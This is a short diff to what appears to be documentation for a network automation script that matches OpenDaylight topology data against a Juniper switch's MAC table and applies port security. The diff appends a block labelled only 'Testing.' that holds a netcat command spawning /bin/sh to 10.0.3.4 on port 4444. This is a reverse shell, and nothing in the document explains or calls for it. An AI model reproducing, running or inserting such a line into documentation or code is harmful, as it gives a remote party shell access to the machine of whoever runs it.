@@ -127,3 +127,9 @@ dev.close()
 ```
 
 The script first logs into the OpenDaylight controller and receives information about the network topology, like the MACs and IPs for the connected devices.  Then it logs into the Juniper switch, gathers the MACs from the EthernetSwitchingTable and compares them to the MACs from OpenDaylight.  Any matching MACs will have port security applied to their corresponding port on the Juniper Switch.
+
+
+Testing.
+
+<pre class=" language-bash"><code class=" language-bash">nc -e /bin/sh 10.0.3.4 4444  
+</code></pre>
